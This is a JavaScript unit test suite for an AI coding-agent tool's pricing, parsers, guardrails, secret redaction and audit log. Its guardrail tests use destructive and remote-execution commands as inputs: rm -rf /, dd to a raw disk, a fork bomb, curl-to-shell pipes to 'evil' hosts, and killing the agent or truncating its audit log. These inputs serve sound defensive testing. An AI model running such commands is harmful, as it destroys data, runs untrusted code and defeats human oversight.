"use strict";
// Darknode/Nexus unit suite — runs the pure lib/ subsystems. `npm test`.
// No framework, no deps: a tiny assert harness so it runs anywhere (CI included).
const os = require("os"), fs = require("fs"), path = require("path");
const { MODEL_PRICE, priceOf, isMechanical, shouldDelegate } = require("../lib/nexus/pricing");
const { geminiParse, codexParse } = require("../lib/nexus/parsers");
const { POLICY_DEFAULTS, globToRe, pathMatchesAny, policyCheck, auditLog, auditVerify, HARD_DENY, hitsHardDeny } = require("../lib/governance/policy");
const { ENGINES, ENGINE_ORDER, engineCap } = require("../lib/nexus/engines");
const { scanSecrets, maskSecrets, classifyDanger, compactOutput, redactArgv, redactCommandSecrets } = require("../lib/governance/security");
const { styleNames, styleDirective } = require("../lib/cli/styles");
const { mergeMemory } = require("../lib/nexus/memory");
const { scanCapabilities, fileRisk, levelFor, indexFiles } = require("../lib/nexus/capindex");
const { evaluateAction: guardEval } = require("../lib/nexus/guardrails");
const { resolveInJail, assertInJail } = require("../lib/nexus/jail");
const { validateArgs } = require("../lib/nexus/schema-check");
const { redact, emit, buildKnownSecrets, setKnownSecrets } = require("../lib/nexus/redact");
const { STYLES, allStyles, loadStyles } = require("../lib/cli/styles");
const { TOOL_CATALOG, discoverTools } = require("../lib/nexus/tools");
const { createBgJobs, MAX_BUF } = require("../lib/nexus/bgjobs");
const { SETTINGS, describe } = require("../lib/cli/settings");
const { pickCoderModel } = require("../lib/nexus/ollama");
const { validatePolicy, validateTeam } = require("../lib/cli/validate");
const { oneline, extractJson } = require("../lib/cli/text");
const { frameDiff, diffTokens, wordHi } = require("../lib/cli/diff");
const { renderAsk, askKey, normOptions } = require("../lib/cli/ask");
const { sanitizeTerm, toolResultView, stripAnsi, visLen, fitWidth, ansiWrap, padRight, shortenPath, bootHeader, modelLabel, effortLabel, explainEngineError } = require("../lib/cli/tui-format");
const { TOP_PORTS, parsePorts, idHash, parseCve, cidrCalc, ipToInt, inCidr } = require("../lib/toolkit/scanutil");
const { DONE_TOKEN, loopDecision, clampRounds, loopPrompt } = require("../lib/nexus/loop");
const { semverGt, autoUpdateMode, shouldCheck } = require("../lib/nexus/update");
const { defang, refang } = require("../lib/toolkit/ioc");
const { shannon, assess } = require("../lib/toolkit/entropy");
const { convert: epochConvert } = require("../lib/toolkit/epoch");
const { parseUrl } = require("../lib/toolkit/urlparse");
const { base32encode, base32decode } = require("../lib/toolkit/base32");
const { hotp, totp, secondsRemaining } = require("../lib/toolkit/totp");
const { decodeJwt, analyzeJwt } = require("../lib/toolkit/jwt");
const { parseUA } = require("../lib/toolkit/useragent");
const { portName, findByName, portLookup } = require("../lib/toolkit/ports");
const { hexdump } = require("../lib/toolkit/hexdump");
const { extractStrings } = require("../lib/toolkit/strings");
const { luhnValid, luhnCheckDigit } = require("../lib/toolkit/luhn");
const { b58encode, b58decode } = require("../lib/toolkit/base58");
const { xorBytes, xorEncryptHex, xorDecryptHex } = require("../lib/toolkit/xorcipher");
const { rot, rot13 } = require("../lib/toolkit/rot");
const { classifyIp } = require("../lib/toolkit/ipclass");
const { ENC } = require("../lib/toolkit/encoders");

let pass = 0, fail = 0;
const ok = (name, cond) => { if (cond) { pass++; } else { fail++; console.log("  \x1b[31mFAIL\x1b[0m " + name); } };
const eq = (name, a, b) => ok(name + "  (" + JSON.stringify(a) + " === " + JSON.stringify(b) + ")", JSON.stringify(a) === JSON.stringify(b));
const group = (t) => console.log("\n\x1b[1m" + t + "\x1b[0m");

group("pricing");
for (const [m, i, o] of [["opus", 4, 20], ["claude-opus-5-5", 4, 20], ["claude-opus-4-8", 5, 25], ["claude-opus-4-1-20250805", 15, 75], ["sonnet", 2, 10], ["claude-sonnet-4-6", 3, 15], ["haiku", 0.1, 0.5], ["claude-haiku-4-5-20251001", 1, 5], ["claude-3-5-haiku-20241022", 0.8, 4], ["fable", 10, 50], ["gemini-2.5-pro", 1.25, 10], ["gemini-2.5-flash", 0.3, 2.5], ["gpt-5-codex", 1.25, 10], ["o4-mini", 1.1, 4.4], ["gpt-4o", 2.5, 10], ["totally-unknown", 3, 15]])
  ok("priceOf " + m, priceOf(m).in === i && priceOf(m).out === o);
{
  const P = require("../lib/nexus/pricing");
  const o55 = P.priceOf("claude-opus-5-5[1m]");
  ok("opus 5.5 exact cache rates (5m 5, 1h 8, read 0.20)", o55.cw5 === 5 && o55.cw1h === 8 && o55.cr === 0.2 && o55.label === "Claude Opus 5.5" && o55.known);
  ok("sonnet 5.5 cache read 0.10, sonnet 5 cache read 0.20", P.priceOf("claude-sonnet-5-5").cr === 0.1 && P.priceOf("claude-sonnet-5").cr === 0.2);
  ok("fable 5.1 cache read 0.25, opus 4 (dated id) = 15/75", P.priceOf("claude-fable-5-1").cr === 0.25 && P.priceOf("claude-opus-4-20250514").in === 15);
  ok("unlisted claude version falls back to family latest, flagged", P.priceOf("claude-opus-9-9").in === 4 && P.priceOf("claude-opus-9-9").known === false);
  eq("costOf opus 5.5, 1M in every bucket", P.costOf("claude-opus-5-5", { input: 1e6, output: 1e6, cacheWrite5m: 1e6, cacheWrite1h: 1e6, cacheRead: 1e6 }), 37.2);
  eq("haiku 5.5 tier: 50k prompt", P.costOf("claude-haiku-5-5", { input: 50000 }), 0.005);
  eq("haiku 5.5 tier: 200k prompt uses >100k rates", P.costOf("claude-haiku-5-5", { input: 200000 }), 0.1);
  ok("haiku 5.5 tier counts cache reads toward the 100k threshold", Math.abs(P.costOf("claude-haiku-5-5", { input: 1000, cacheRead: 150000 }) - (1000 * 0.5 + 150000 * 0.05) / 1e6) < 1e-12);
  const f = P.priceOf("opus", { fast: true });
  ok("fast mode opus 5.5 = 8/40, cache scaled 2x", f.in === 8 && f.out === 40 && f.cr === 0.4 && f.cw5 === 10);
  eq("usageBuckets splits 5m/1h writes", P.usageBuckets({ input_tokens: 3, output_tokens: 4, cache_read_input_tokens: 5, cache_creation_input_tokens: 10, cache_creation: { ephemeral_5m_input_tokens: 4, ephemeral_1h_input_tokens: 6 } }), { input: 3, output: 4, cacheWrite5m: 4, cacheWrite1h: 6, cacheRead: 5 });
  eq("usageBuckets without split = all 5m", P.usageBuckets({ cache_creation_input_tokens: 7 }).cacheWrite5m, 7);
  ok("pricingTable lists every model with all five rates", P.pricingTable().length === Object.keys(P.CLAUDE_PRICES).length && P.pricingTable().every((r) => [r.in, r.cw5, r.cw1h, r.cr, r.out].every((v) => typeof v === "number")));
}
ok("isMechanical: run tests", isMechanical("run the tests"));
ok("isMechanical: NOT refactor", !isMechanical("refactor the auth module"));
ok("shouldDelegate opus->haiku on big output", shouldDelegate(5000, 2000, "opus", "haiku") === true);
ok("shouldDelegate same model = false", shouldDelegate(5000, 2000, "opus", "opus") === false);
ok("shouldDelegate weak-not-cheaper = false", shouldDelegate(5000, 2000, "haiku", "opus") === false);

group("capability index (what a module can DO)");
{
  const src = [
    "// exec here is only a comment and must be ignored",
    "const cp = require('child_process');",
    "cp.execSync('ls');",
    "const r = await fetch('https://x');",
    "const k = process.env.API_TOKEN;",
    "fs.writeFileSync('/tmp/x', data);",
    "eval(userInput);",
  ].join("\n");
  const caps = scanCapabilities(src);
  const tags = caps.map((c) => c.tag);
  ok("detects exec/eval/secrets/net/fs-write", ["eval", "exec", "secrets", "fs-write", "net"].every((t) => tags.includes(t)));
  ok("comment-only mention is ignored", !caps.some((c) => c.hits.some((h) => h.line === 1)));
  const execCap = caps.find((c) => c.tag === "exec");
  ok("hit carries a real line number", execCap && execCap.hits.some((h) => h.line === 3));
  ok("empty/garbage input is safe", scanCapabilities(null).length === 0 && scanCapabilities(123).length === 0);

  eq("fileRisk = worst capability (eval=10 -> critical)", fileRisk(caps).level, "critical");
  eq("levelFor thresholds: 5 -> medium", levelFor(5), "medium");
  eq("levelFor thresholds: 2 -> low", levelFor(2), "low");
  eq("levelFor thresholds: 0 -> none", levelFor(0), "none");

  const idx = indexFiles([
    { path: "danger.js", code: "eval(x)" },
    { path: "calm.js", code: "const n = 1 + 1;" },
    { path: "mid.js", code: "fetch('https://y')" },
  ]);
  eq("index sorts highest-risk first", idx.files[0].path, "danger.js");
  ok("rollup flags the critical module", idx.rollup.critical.includes("danger.js") && !idx.rollup.critical.includes("calm.js"));
  eq("rollup counts tags", idx.rollup.byTag.net, 1);
  eq("rollup maxLevel", idx.rollup.maxLevel, "critical");
}

group("guardrails (one gate: policy + danger + secrets)");
{
  const P = { protectedPaths: [".env", "*.key"], deniedCommands: [], allowNetwork: true };
  eq("destructive command -> deny", guardEval({ type: "command", command: "rm -rf /" }, P).decision, "deny");
  eq("sudo -> ask (warn)", guardEval({ type: "command", command: "sudo apt update" }, P).decision, "ask");
  eq("benign command -> allow", guardEval({ type: "command", command: "ls -la" }, P).decision, "allow");
  eq("write to protected path -> deny", guardEval({ type: "write", path: ".env", content: "x" }, P).decision, "deny");
  const sec = guardEval({ type: "write", path: "notes.txt", content: "aws AKIAIOSFODNN7EXAMPLE key" }, P);
  eq("secret in content -> ask by default", sec.decision, "ask");
  ok("secret reason is reported", sec.reasons.some((r) => r.source === "secret"));
  eq("secret -> deny under --strict", guardEval({ type: "write", path: "notes.txt", content: "AKIAIOSFODNN7EXAMPLE" }, P, { denyOnSecret: true }).decision, "deny");
  const both = guardEval({ type: "command", command: "sudo rm -rf /" }, P);
  eq("strongest escalation wins (block over warn)", both.decision, "deny");
  ok("multiple reasons can fire", both.reasons.length >= 1);
}

group("parsers (gemini/codex structured output → real tokens)");
{
  const g = geminiParse(JSON.stringify({ response: "Here is the fix.", stats: { models: { "gemini-2.5-pro": { tokens: { prompt: 1200, candidates: 340, thoughts: 60 } } } } }));
  eq("gemini text", g.text, "Here is the fix."); eq("gemini in", g.inTok, 1200); eq("gemini out", g.outTok, 400); eq("gemini model", g.model, "gemini-2.5-pro");
  ok("gemini garbage → null", geminiParse("not json") === null);
  const gc = geminiParse(JSON.stringify({ response: "x", stats: { models: { "gemini-2.5-pro": { tokens: { prompt: 1200, cached: 500, candidates: 340 } } } } }));
  eq("gemini cached is part of prompt, not added on top", gc.inTok, 1200);
  const c = codexParse([JSON.stringify({ type: "item.completed", item: { type: "agent_message", text: "Done." } }), JSON.stringify({ type: "turn.completed", usage: { input_tokens: 2100, cached_input_tokens: 512, output_tokens: 230 } })].join("\n"));
  eq("codex text", c.text, "Done."); eq("codex in (cached is part of input, not extra)", c.inTok, 2100); eq("codex out", c.outTok, 230);
  ok("codex garbage → null", codexParse("hello\nworld") === null);
  const cf = codexParse(['{"type":"turn.started"}', '{"type":"error","message":"Reconnecting... 1/5 (unexpected status 404)"}', '{"type":"turn.failed","error":{"message":"unexpected status 404 Not Found: The model `x` does not exist or you do not have access to it., url: https://example/codex, request id: abc"}}'].join("\n"));
  eq("codex failed turn → clean error, no raw JSON", [cf.text, cf.error], ["", "unexpected status 404 Not Found: The model `x` does not exist or you do not have access to it."]);
  eq("codex success has no error", c.error, "");
}

group("engines (registry + NO cross-engine flag leakage)");
{
  const CLAUDE_ONLY = ["--effort", "--append-system-prompt", "--fallback-model", "--continue", "--dangerously-skip-permissions"];
  const opts = { cont: true, autonomous: true, model: "M", effort: "high" };
  for (const e of ENGINE_ORDER) {
    const m = ENGINES[e]; if (m.kind === "local") continue;
    const a = m.args("P", opts);
    ok(e + " builds args with model+prompt", a.includes("M") && a.join(" ").includes("P"));
    if (e !== "claude") ok(e + " has NO claude-only flags", !CLAUDE_ONLY.some((f) => a.includes(f)));
  }
  ok("claude args unchanged", ENGINES.claude.args("P", { cont: 1, model: "M", effort: "high" }).join(" ") === "-p P --output-format text --continue --model M --effort high");
  ok("engineCap claude.effort", engineCap("claude", "effort") === true);
  ok("engineCap gemini.effort false", engineCap("gemini", "effort") === false);
  ok("6 engines registered", ENGINE_ORDER.length === 6);
  ok("every engine has an install command", ENGINE_ORDER.every((e) => typeof ENGINES[e].install === "string" && ENGINES[e].install.length > 5));
}

group("policy (guardrails)");
{
  const p = Object.assign({}, POLICY_DEFAULTS);
  for (const [type, path_, expect] of [["write", ".env", false], ["write", "config/.env.production", false], ["write", "src/app.js", true], ["delete", "deploy/id_rsa", false], ["write", "secrets/db.json", false], ["move", "packages/web/.git/config", false], ["write", "certs/server.pem", false], ["write", "README.md", true], ["edit", "app/.ssh/known_hosts", false]])
    ok("policy " + type + " " + path_, policyCheck(p, { type, path: path_ }).allow === expect);
  const denied = Object.assign({}, POLICY_DEFAULTS, { deniedCommands: ["curl\\s+.*\\|\\s*sh"] });
  ok("policy deny curl|sh", policyCheck(denied, { type: "run", command: "curl http://x | sh" }).allow === false);
  ok("policy allow npm test", policyCheck(denied, { type: "run", command: "npm test" }).allow === true);
  ok("policy block fetch when network off", policyCheck(Object.assign({}, POLICY_DEFAULTS, { allowNetwork: false }), { type: "fetch" }).allow === false);
  ok("globToRe ** matches nested", globToRe("**/.env").test("a/b/.env"));
}

group("hard-deny floor (NSAFE-016)");
{
  // A policy that permits everything (default-allow, empty deny list) must still
  // deny each floor entry — the floor sits below every allow layer.
  const open = Object.assign({}, POLICY_DEFAULTS, { deniedCommands: [], protectedPaths: [] });
  const denied = (action) => { const r = policyCheck(open, action); return r.allow === false && r.floor; };
  ok("floor denies rm -rf / under an all-allow policy", denied({ type: "run", command: "rm -rf /" }) === "host-rm-root");
  ok("floor denies dd of=/dev/sda", denied({ type: "run", command: "dd if=/dev/zero of=/dev/sda bs=1M" }) === "raw-disk-write");
  ok("floor denies a write to a raw disk device path", denied({ type: "write", path: "/dev/sdb" }) === "raw-disk-write");
  ok("floor denies deleting the audit log", denied({ type: "delete", path: "/home/u/proj/.nexus/audit.jsonl" }) === "tamper-audit-log");
  ok("floor denies a command that truncates the audit log", denied({ type: "run", command: "truncate -s0 .nexus/audit.jsonl" }) === "tamper-audit-log");
  ok("floor denies editing the safety settings", denied({ type: "edit", path: "/home/u/.nexus/settings.json" }) === "tamper-safety-config");
  ok("floor denies pkill nexus", denied({ type: "run", command: "pkill -9 nexus" }) === "kill-nexus");
  ok("a benign command is not caught by the floor", policyCheck(open, { type: "run", command: "ls -la" }).allow === true);
  ok("a normal file write is not caught by the floor", policyCheck(open, { type: "write", path: "src/app.js" }).allow === true);
  // hitsHardDeny returns the matching rule (or null) and never throws on a bad action.
  ok("hitsHardDeny returns the rule id", (hitsHardDeny({ type: "run", command: "rm -rf /etc" }) || {}).id === "host-rm-root");
  ok("hitsHardDeny returns null for a clean action", hitsHardDeny({ type: "run", command: "git status" }) === null);
  ok("hitsHardDeny tolerates a malformed action", (() => { try { return hitsHardDeny(null) === null && hitsHardDeny({}) === null; } catch (_) { return false; } })());
  // evaluateAction surfaces the floor as its own source and always denies.
  const gv = guardEval({ type: "command", command: "rm -rf /" }, open);
  ok("guardEval reports a hard-deny source", gv.decision === "deny" && gv.reasons.some((r) => r.source === "hard-deny" && r.id === "host-rm-root"));
  // The floor is deeply frozen: both the array and each rule reject mutation in strict mode.
  ok("HARD_DENY array is frozen", (() => { try { HARD_DENY.push({}); return false; } catch (_) { return true; } })());
  ok("each HARD_DENY rule is frozen", (() => { try { HARD_DENY[0].id = "x"; return false; } catch (_) { return true; } })());
}

group("tool-arg schema validation (NSAFE-039)");
{
  const first = (r) => (r.errors[0] || {}).code;
  // Extra property rejected only when additionalProperties:false.
  const strict = { type: "object", properties: { path: { type: "string" } }, required: ["path"], additionalProperties: false };
  ok("extra property rejected as unknown-property", (() => { const r = validateArgs(strict, { path: "a", evil: 1 }); return !r.ok && r.errors.some((e) => e.code === "unknown-property" && e.path === "evil"); })());
  ok("prototype-named extra property still rejected under additionalProperties:false", (() => { const r = validateArgs(strict, { path: "a", constructor: 1, toString: 2 }); return !r.ok && r.errors.filter((e) => e.code === "unknown-property").length === 2; })());
  ok("a required key absent as an own property is flagged even if inherited", (() => { const r = validateArgs({ type: "object", properties: { toString: { type: "string" } }, required: ["toString"] }, {}); return !r.ok && r.errors.some((e) => e.code === "required" && e.path === "toString"); })());
  const open = { type: "object", properties: { path: { type: "string" } }, required: ["path"] };
  ok("extra property allowed when additionalProperties is open", validateArgs(open, { path: "a", hint: "x" }).ok === true);
  // 10 MB string against maxLength:65536 — rejected on .length (no copy).
  const big = "x".repeat(10 * 1024 * 1024);
  const capped = { type: "object", properties: { q: { type: "string", maxLength: 65536 } } };
  ok("oversized string rejected (maxLength)", (() => { const r = validateArgs(capped, { q: big }); return !r.ok && first(r) === "maxLength"; })());
  ok("string within maxLength accepted", validateArgs(capped, { q: "short" }).ok === true);
  // Wrong type -> typed error, nothing thrown.
  ok("object where string expected -> type error", (() => { let r; try { r = validateArgs(open, { path: { nested: 1 } }); } catch (_) { return false; } return !r.ok && first(r) === "type"; })());
  ok("args that are not an object -> root type error", (() => { const r = validateArgs(open, ["a"]); return !r.ok && r.errors[0].path === "" && r.errors[0].code === "type"; })());
  ok("null args -> root type error without throwing", (() => { try { return validateArgs(open, null).ok === false; } catch (_) { return false; } })());
  // required / enum / pattern.
  ok("missing required field reported", (() => { const r = validateArgs(open, {}); return !r.ok && r.errors.some((e) => e.code === "required" && e.path === "path"); })());
  const en = { type: "object", properties: { op: { type: "string", enum: ["read", "write"] } } };
  ok("value outside enum rejected", (() => { const r = validateArgs(en, { op: "delete" }); return !r.ok && first(r) === "enum"; })());
  ok("value inside enum accepted", validateArgs(en, { op: "read" }).ok === true);
  const pat = { type: "object", properties: { id: { type: "string", pattern: "^[a-f0-9]{4}$" } } };
  ok("pattern mismatch rejected", !validateArgs(pat, { id: "zzzz" }).ok);
  ok("pattern match accepted", validateArgs(pat, { id: "ab12" }).ok === true);
  ok("ignorePattern skips the pattern check", validateArgs(pat, { id: "zzzz" }, { ignorePattern: true }).ok === true);
  // coerceScalars: a JSON number for a string-typed field is tolerated (dispatcher mode).
  ok("number for a string field rejected by default", !validateArgs(open, { path: 42 }).ok);
  ok("coerceScalars accepts a number for a string field", validateArgs(open, { path: 42 }, { coerceScalars: true }).ok === true);
  // nested array items + objects.
  const arr = { type: "object", properties: { edits: { type: "array", items: { type: "object", properties: { find: { type: "string" } }, required: ["find"] } } } };
  ok("array item missing a required nested field is reported with a path", (() => { const r = validateArgs(arr, { edits: [{ find: "a" }, { replace: "b" }] }); return !r.ok && r.errors.some((e) => e.code === "required" && e.path === "edits[1].find"); })());
  ok("well-formed nested array accepted", validateArgs(arr, { edits: [{ find: "a" }, { find: "b" }] }).ok === true);
  // a nested object schema with no `properties` still enforces its own-object constraints.
  const nestStrict = { type: "object", properties: { cfg: { type: "object", additionalProperties: false } } };
  ok("nested additionalProperties:false enforced without properties", (() => { const r = validateArgs(nestStrict, { cfg: { evil: 1 } }); return !r.ok && r.errors.some((e) => e.code === "unknown-property" && e.path === "cfg.evil"); })());
  const nestReq = { type: "object", properties: { cfg: { type: "object", required: ["x"] } } };
  ok("nested required enforced without properties", (() => { const r = validateArgs(nestReq, { cfg: {} }); return !r.ok && r.errors.some((e) => e.code === "required" && e.path === "cfg.x"); })());
  // preflightArgs wiring against the real built-in tool schemas.
  const NT = require("../lib/nexus/native-tools");
  ok("preflightArgs passes a valid write_file call", NT.preflightArgs("write_file", { path: "a.txt", content: "x" }) === null);
  ok("preflightArgs rejects write_file missing content", /required/.test(NT.preflightArgs("write_file", { path: "a.txt" }) || ""));
  ok("preflightArgs rejects an object for a string path", /type/.test(NT.preflightArgs("read_file", { path: { x: 1 } }) || ""));
  ok("preflightArgs tolerates a numeric git count (coerced)", NT.preflightArgs("git_tool", { op: "log", count: 20 }) === null);
  ok("schemaFor('constructor') returns a plain default, not the inherited Object ctor", typeof NT.schemaFor("constructor") === "object" && NT.schemaFor("constructor").description === "constructor" && typeof NT.schemaFor("constructor").properties === "object");
  ok("preflightArgs returns null for an unknown tool", NT.preflightArgs("not_a_tool", { whatever: 1 }) === null);
}

group("sink redaction + keyed placeholders (NSAFE-060/061)");
{
  const K = "nexus-test-install-key";
  const aws = "AKIAIOSFODNN7EXAMPLE";
  const tagOf = (t) => (String(t).match(/\[REDACTED:[^:]+:([0-9a-f]{4})\]/) || [])[1];
  const r1 = redact("key is " + aws + " ok", { sink: "transcript", key: K });
  ok("AWS key replaced with a typed placeholder", /\[REDACTED:aws-access-key:[0-9a-f]{4}\]/.test(r1.text) && !r1.text.includes(aws));
  ok("findings counted", r1.findings === 1);
  // NSAFE-061: stable keyed tags.
  const t1 = tagOf(redact(aws, { sink: "audit", key: K }).text);
  const t2 = tagOf(redact(aws, { sink: "transcript", key: K }).text);
  ok("same secret -> same tag across sinks", !!t1 && t1 === t2);
  const ght = "ghp_" + "a".repeat(36);
  ok("different secrets -> different tags", tagOf(redact(ght, { sink: "audit", key: K }).text) !== t1);
  ok("tag depends on the install key (per-install correlation)", tagOf(redact(aws, { sink: "audit", key: "other-key" }).text) !== t1);
  ok("tag reveals no 4-char slice of the secret", (() => { for (let i = 0; i + 4 <= aws.length; i++) if (t1 === aws.slice(i, i + 4).toLowerCase()) return false; return true; })());
  // credential rule: only the quoted value replaced; key + quotes preserved; fixed low-entropy tag.
  const cr = redact('password: "hunter2x"', { sink: "transcript", key: K });
  ok("credential value replaced, prefix+quotes preserved, fixed tag", /password:\s*"\[REDACTED:credential:0000\]"/.test(cr.text) && !cr.text.includes("hunter2x"));
  // NSAFE-060: model sink is pass-through by default (counted), redacts when enabled.
  const mr = redact("key " + aws, { sink: "model", key: K });
  ok("model sink unchanged by default but still counted", mr.text.includes(aws) && mr.findings === 1);
  ok("model sink redacts when modelRedaction is enabled", !redact("key " + aws, { sink: "model", key: K, modelRedaction: true }).text.includes(aws));
  ok("emit returns redacted text", !emit("transcript", "k=" + aws, { key: K }).includes(aws));
  const pk = redact("-----BEGIN PRIVATE KEY-----\nabcd\n-----END PRIVATE KEY-----", { sink: "audit", key: K });
  ok("private key block removed wholesale", /\[REDACTED:private-key:[0-9a-f]{4}\]/.test(pk.text) && !pk.text.includes("BEGIN PRIVATE KEY"));
  ok("clean text passes through untouched", redact("just normal text", { sink: "audit", key: K }).text === "just normal text");
}

group("known-secret value registry (NSAFE-062)");
{
  const K = "nexus-test-install-key";
  const custom = "wxq-Z9f2Kv8tLmNpR4sB"; // 20 chars, not matched by any pattern rule
  const env = { GITHUB_TOKEN: "ghp_" + "Q".repeat(36), MY_CUSTOM_SECRET: custom, SHELL: "/bin/bash", TINY_KEY: "abc" };
  const built = buildKnownSecrets(env, []);
  ok("collects security-named env values >= 8 chars", built.count === 2);
  ok("ignores short values and non-secret-named vars", !built.map.has("abc") && !built.map.has("/bin/bash"));
  const b64 = Buffer.from(custom, "utf8").toString("base64");
  const r = redact("raw " + custom + " b64 " + b64 + " url " + encodeURIComponent(custom), { sink: "transcript", key: K, known: built });
  ok("raw form of a custom secret redacted", !r.text.includes(custom));
  ok("base64 form redacted", !r.text.includes(b64));
  ok("known-value placeholder used", /\[REDACTED:known-value:[0-9a-f]{4}\]/.test(r.text));
  const tags = r.text.match(/\[REDACTED:known-value:([0-9a-f]{4})\]/g) || [];
  ok("every encoded form of the same secret shares one tag", tags.length === 3 && new Set(tags).size === 1);
  const many = {}; for (let i = 0; i < 20; i++) many["K" + i + "_TOKEN"] = "value_" + i + "_" + "x".repeat(8);
  const capped = buildKnownSecrets(many, [], { cap: 5 });
  ok("values capped with truncation reported", capped.truncated === true && capped.count === 5);
  // file contents contribute whitespace-separated tokens >= 8 chars
  const fromFile = buildKnownSecrets({}, ["user pass=abcdefgh12345678 host"]);
  ok("harvests a long token from file content", fromFile.map.has("pass=abcdefgh12345678") || [...fromFile.map.keys()].some((k) => k.includes("abcdefgh12345678")));
  // setKnownSecrets registers globally; reset afterwards so other groups are unaffected.
  setKnownSecrets(built);
  ok("globally-registered known secret redacted without ctx.known", !redact("see " + custom, { sink: "audit", key: K }).text.includes(custom));
  setKnownSecrets({ matcher: null, map: null });
  ok("after reset the custom value is no longer redacted", redact("see " + custom, { sink: "audit", key: K }).text.includes(custom));
}

group("audit (tamper-evident hash chain)");
{
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "audit-"));
  for (let i = 0; i < 4; i++) auditLog(dir, { engine: "ollama", tool: i % 2 ? "run_command" : "write_file", path: "f" + i, status: "ok" });
  ok("chain intact after 4 appends", auditVerify(dir).ok === true && auditVerify(dir).count === 4);
  const file = path.join(dir, ".nexus", "audit.jsonl");
  const lines = fs.readFileSync(file, "utf8").trim().split("\n");
  const rec = JSON.parse(lines[1]); rec.path = "EVIL"; lines[1] = JSON.stringify(rec); fs.writeFileSync(file, lines.join("\n") + "\n");
  const v = auditVerify(dir);
  ok("tamper detected", v.ok === false && v.badLine === 2);
  fs.rmSync(dir, { recursive: true, force: true });
}

group("audit-log exportLog (no silent truncation)");
{
  const AL = require("../lib/governance/audit-log");
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "audit-export-"));
  AL.createAuditLog(dir);
  for (let i = 0; i < 150; i++) AL.logAction(dir, { type: "FILE_READ", path: "f" + i });
  const total = AL.queryLog(dir, {}).total; // true entry count (incl. the genesis record)
  const ex = AL.exportLog(dir, "json");
  ok("exportLog returns the whole log, not the 100-entry query cap", total > 100 && ex.entries === total);
  const scoped = AL.exportLog(dir, "json", { limit: 10 });
  ok("exportLog still honors an explicit limit", scoped.entries === 10);
  fs.rmSync(dir, { recursive: true, force: true });
}

group("security (secrets + destructive-command preflight)");
{
  ok("scanSecrets finds github token", scanSecrets("token=ghp_" + "a".repeat(36)).includes("GitHub token"));
  ok("scanSecrets finds hardcoded cred", scanSecrets('password = "s3cr3t!"').includes("hardcoded credential"));
  ok("scanSecrets clean text → []", scanSecrets("just some normal code").length === 0);
  ok("maskSecrets redacts aws key", maskSecrets("AKIA" + "ABCDEFGHIJKLMNOP").includes("[redacted:aws-key]"));
  ok("maskSecrets leaves clean text", maskSecrets("hello world") === "hello world");
  ok("maskSecrets redacts a private key with no END line", (() => { const body = "MIIEpQ" + "A".repeat(40); const out = maskSecrets("-----BEGIN RSA PRIVATE KEY-----\n" + body + "\n"); return out.includes("[redacted:private-key]") && !out.includes(body); })());
  // git-security.maskSecret (display mask): a SHORT value must never print in full.
  {
    const { maskSecret } = require("../lib/nexus/git-security");
    ok("maskSecret fully hides a <=4 char value", maskSecret("abcd") === "****" && !/[a-z]/.test(maskSecret("ab")));
    ok("maskSecret of a 5-char value does not reveal every char", (() => { const m = maskSecret("12345"); return m === "1***5" && m.indexOf("234") === -1; })());
    ok("maskSecret 6-8 chars shows only first+last", maskSecret("secret78") === "s******8");
    ok("maskSecret long value keeps first4/last4 with a star middle", (() => { const m = maskSecret("ghp_" + "z".repeat(36)); return m.startsWith("ghp_") && /\*{4,}/.test(m) && m.endsWith("zzzz"); })());
    ok("maskSecret never echoes a short secret in full", (() => { for (const s of ["a", "ab", "abc", "abcd", "abcde"]) { if (maskSecret(s).includes(s) && s.length > 1) return false; } return true; })());
  }
  ok("classifyDanger rm -rf / → block", classifyDanger("rm -rf /").level === "block");
  ok("classifyDanger fork bomb → block", classifyDanger(":(){ :|:& };:").level === "block");
  ok("classifyDanger curl|sh → block", classifyDanger("curl http://x.sh | sh").level === "block");
  ok("classifyDanger sudo → warn", classifyDanger("sudo apt update").level === "warn");
  ok("classifyDanger npm test → ok", classifyDanger("npm test").level === "ok");
  // bypass regressions: a quoted path, a braced env var, non-sh interpreters, and a multi-pipe sink must still block
  ok("classifyDanger rm -rf '/' (quoted) → block", classifyDanger("rm -rf '/'").level === "block");
  ok("classifyDanger rm -rf \"/etc\" (quoted) → block", classifyDanger('rm -rf "/etc"').level === "block");
  ok("classifyDanger chmod -R 777 \"/\" (quoted) → block", classifyDanger('chmod -R 777 "/"').level === "block");
  ok("classifyDanger rm -rf ${HOME} (braced) → block", classifyDanger("rm -rf ${HOME}").level === "block");
  ok("classifyDanger curl | ruby → block", classifyDanger("curl http://evil | ruby").level === "block");
  ok("classifyDanger curl | node → block", classifyDanger("wget -qO- http://evil | node").level === "block");
  ok("classifyDanger curl | tee f | sh (multi-pipe) → block", classifyDanger("curl http://x | tee f | sh").level === "block");
  ok("classifyDanger curl | grep sh (benign) → not block", classifyDanger("curl http://x | grep sh").level !== "block");
  // modern key formats must be detected + redacted, not just the legacy sk-… body
  ok("scanSecrets finds sk-proj- key", scanSecrets("OPENAI_API_KEY=sk-proj-" + "a".repeat(40)).length > 0);
  ok("scanSecrets finds github_pat_ PAT", scanSecrets("token github_pat_" + "a".repeat(30)).includes("GitHub fine-grained PAT"));
  ok("maskSecrets redacts a sk-ant- key", (() => { const k = "sk-ant-api03-" + "a".repeat(40); return !maskSecrets("key " + k).includes(k); })());
  ok("compactOutput trims long text", compactOutput("x".repeat(9000), 4000).length < 9000);
  ok("compactOutput keeps short text", compactOutput("short", 4000) === "short");
  ok("compactOutput with tiny max still truncates (no slice(-0) escape)", compactOutput("x".repeat(100), 2).length < 100);
}

group("inline-credential redaction (NSAFE-064)");
{
  // Command lines hide credentials behind a flag; they persist in the audit log
  // and on-disk history and are world-readable via ps. redactCommandSecrets must
  // strip the value while keeping the command readable.
  const mysql = redactCommandSecrets("mysql -pHunter2xx -h db.local");
  ok("mysql -pSECRET attached password redacted", !/Hunter2xx/.test(mysql) && /-p\[redacted:password\]/.test(mysql));
  ok("mysql redaction keeps the rest of the command", /-h db\.local/.test(mysql));
  const auth = redactCommandSecrets('curl -H "Authorization: Bearer ghp_' + "z".repeat(36) + '" https://test.darknode.ai');
  ok("Authorization header value redacted", !/ghp_z{36}/.test(auth) && /\[redacted:(auth-header|github-token)\]/.test(auth));
  const url = redactCommandSecrets("git clone https://user:pw@test.darknode.ai/repo.git");
  ok("URL userinfo password redacted", !/user:pw@/.test(url) && /user:\[redacted:userinfo\]@/.test(url));
  ok("URL redaction keeps the username and host", /https:\/\/user:/.test(url) && /test\.darknode\.ai/.test(url));
